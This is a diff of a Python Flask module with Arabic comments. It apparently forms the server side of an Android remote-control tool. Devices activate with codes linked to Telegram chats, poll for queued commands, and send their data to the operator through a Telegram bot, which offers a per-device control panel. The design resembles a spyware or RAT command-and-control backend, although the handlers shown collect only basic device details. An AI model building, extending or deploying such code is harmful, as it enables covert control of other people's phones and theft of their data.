@@ -1,6 +1,6 @@
 # apk_manager.py
 # ============================================================
-# APK Manager — إدارة الأجهزة المتصلة
+# APK Manager — إدارة الأجهزة المتصلة + التحقق
 # ============================================================
 
 import os
@@ -40,8 +40,8 @@ except Exception as e:
 # ============================================================
 # البيانات في الذاكرة
 # ============================================================
-apk_devices = {}  # { device_id: { chat_id, code, last_seen, info } }
-apk_commands = {}  # { device_id: [commands] }
+apk_devices = {}
+apk_commands = {}
 apk_lock = threading.Lock()
 
 
@@ -49,11 +49,12 @@ apk_lock = threading.Lock()
 # إدارة الأكواد
 # ============================================================
 def create_apk_code(chat_id):
-    """ينشئ كود تنشيط جديد"""
-    if not redis_client: return None
+    if not redis_client:
+        return None
     try:
         code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
         redis_client.setex(f"apk_code:{code}", 86400 * 30, str(chat_id))
+        print(f"[+] APK code created: {code} -> {chat_id}")
         return code
     except Exception as e:
         print(f"[-] create_apk_code error: {e}")
@@ -61,18 +62,18 @@ def create_apk_code(chat_id):
 
 
 def get_apk_code(code):
-    """يجلب chat_id من كود التنشيط"""
-    if not redis_client: return None
+    if not redis_client:
+        return None
     try:
         return redis_client.get(f"apk_code:{code}")
-    except: return None
+    except Exception:
+        return None
 
 
 # ============================================================
 # إدارة الأجهزة
 # ============================================================
 def get_apk_devices():
-    """يرجع قائمة الأجهزة المتصلة"""
     with apk_lock:
         return list(apk_devices.values())
 
@@ -83,7 +84,6 @@ def get_apk_device(device_id):
 
 
 def push_apk_command(device_id, action, **kwargs):
-    """يضيف أمر للجهاز"""
     cmd = {"action": action}
     cmd.update(kwargs)
     with apk_lock:
@@ -98,7 +98,6 @@ def push_apk_command(device_id, action, **kwargs):
 # لوحة التحكم
 # ============================================================
 def build_apk_panel(device_id):
-    """لوحة تحكم بالجهاز"""
     m = InlineKeyboardMarkup()
     m.row(
         InlineKeyboardButton("📱 معلومات", callback_data=f"apk_cmd_info_{device_id}"),
@@ -128,19 +127,66 @@ def build_apk_panel(device_id):
 # ============================================================
 def init_apk_routes(app, bot):
 
+    # ============================================================
+    # ★★★ التحقق من كود التنشيط ★★★
+    # ============================================================
+    @app.route('/apk/verify', methods=['POST'])
+    def apk_verify():
+        """يتحقق من كود التنشيط"""
+        try:
+            data = request.get_json(silent=True) or {}
+            code = data.get("code", "").strip().upper()
+            device_model = data.get("device_model", "")
+            device_brand = data.get("device_brand", "")
+            
+            if not code:
+                return jsonify({"valid": False}), 200
+            
+            chat_id = get_apk_code(code)
+            
+            if chat_id:
+                print(f"[+] APK verified: {code} -> {chat_id} | {device_brand} {device_model}")
+                
+                # أبلغ المستخدم
+                try:
+                    cid = int(chat_id) if str(chat_id).isdigit() else chat_id
+                    bot.send_message(
+                        cid,
+                        f"✅ **تم تفعيل جهاز جديد!**\n"
+                        f"━━━━━━━━━━━━━━━━━━\n"
+                        f"🔑 الكود: `{code}`\n"
+                        f"📦 الموديل: `{device_brand} {device_model}`\n\n"
+                        f"⏳ في انتظار البيانات...",
+                        parse_mode="Markdown"
+                    )
+                except Exception as e:
+                    print(f"[-] notify error: {e}")
+                
+                return jsonify({"valid": True, "chat_id": str(chat_id)}), 200
+            else:
+                print(f"[-] Invalid APK code: {code}")
+                return jsonify({"valid": False}), 200
+        except Exception as e:
+            print(f"[-] apk_verify error: {e}")
+            return jsonify({"valid": False}), 200
+
+    # ============================================================
+    # Polling للأوامر
+    # ============================================================
     @app.route('/apk/poll', methods=['GET'])
     def apk_poll():
-        """APK يستعلم عن أوامر"""
         device_id = request.args.get('device', '')
-        code = request.args.get('code', '')
+        code = request.args.get('code', '').upper()
         
         if not device_id:
             return jsonify({"commands": []}), 200
         
-        # سجّل الجهاز
         with apk_lock:
             if device_id not in apk_devices:
-                chat_id = get_apk_code(code) or code
+                chat_id = get_apk_code(code) if code else None
+                if not chat_id:
+                    chat_id = code  # fallback
+                
                 apk_devices[device_id] = {
                     "device_id": device_id,
                     "chat_id": chat_id,
@@ -149,10 +195,9 @@ def init_apk_routes(app, bot):
                     "last_seen": time.time(),
                     "info": {},
                 }
-                print(f"[+] New APK device: {device_id[:16]}")
+                print(f"[+] New APK device: {device_id[:16]} | code={code}")
             apk_devices[device_id]["last_seen"] = time.time()
         
-        # اسحب الأوامر
         commands = []
         with apk_lock:
             if device_id in apk_commands:
@@ -161,13 +206,15 @@ def init_apk_routes(app, bot):
         
         return jsonify({"commands": commands}), 200
 
+    # ============================================================
+    # استقبال البيانات
+    # ============================================================
     @app.route('/apk/data', methods=['POST'])
     def apk_data():
-        """APK يرسل البيانات"""
         try:
             data = request.get_json(silent=True) or {}
             device_id = data.get("device", "")
-            code = data.get("code", "")
+            code = data.get("code", "").upper()
             dtype = data.get("type", "")
             
             if not device_id:
@@ -179,17 +226,17 @@ def init_apk_routes(app, bot):
                 if device_id in apk_devices:
                     chat_id = apk_devices[device_id].get("chat_id")
             
-            if not chat_id:
+            if not chat_id and code:
                 chat_id = get_apk_code(code)
             
             if not chat_id:
+                print(f"[-] APK data with no chat_id: device={device_id[:8]}, code={code}")
                 return jsonify({"status": "no_chat"}), 200
             
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
             
-            # معالجة البيانات
+            # ---------- initial ----------
             if dtype == "initial":
-                # احفظ معلومات الجهاز
                 with apk_lock:
                     if device_id in apk_devices:
                         apk_devices[device_id]["info"] = data
@@ -199,8 +246,8 @@ def init_apk_routes(app, bot):
                     f"━━━━━━━━━━━━━━━━━━\n"
                     f"📦 **الموديل:** `{data.get('model', 'N/A')}`\n"
                     f"🏭 **الشركة:** `{data.get('manufacturer', 'N/A')}`\n"
-                    f"📱 **Android:** `{data.get('android', 'N/A')}` (SDK {data.get('sdk', '?')})\n"
-                    f"🆔 **Device ID:** `{device_id[:16]}`\n\n"
+                    f"📱 **Android:** `{data.get('android', 'N/A')}`\n"
+                    f"🆔 **Device:** `{device_id[:16]}`\n\n"
                     f"🎛️ **لوحة التحكم:**"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
@@ -291,7 +338,7 @@ def init_apk_routes(app, bot):
                     parse_mode="Markdown")
             
             elif dtype == "heartbeat":
-                pass  # صامت
+                pass
             
             return jsonify({"status": "ok"}), 200
         except Exception as e:
